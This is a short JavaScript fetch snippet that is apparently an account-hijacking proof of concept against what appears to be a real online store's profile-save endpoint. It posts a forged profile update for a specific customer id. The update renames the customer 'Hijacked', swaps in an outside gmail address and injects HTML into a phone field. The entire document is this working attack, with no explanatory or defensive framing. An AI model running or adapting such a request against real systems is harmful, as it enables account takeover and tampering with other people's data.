fetch('https://store.hypertecsp.com/Customers/saveProfile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'id=9915208&nameFirst=Hijacked&nameLast=Hijacked&title=&email=babbaisme5%40gmail.com&phoneWork=%3Ch1%3ETest&phoneWorkExt=&phoneMobile=&phoneMobileExt=&fax=&faxExt=&phoneHome=&phoneHomeExt=&phoneOther=&phoneOtherExt=&timeZone=-6&language=en_US&addressLine1=123123&addressLine2=&City=test&state=53&zipCode=123133&country=2'
})
.then(response => response.text());
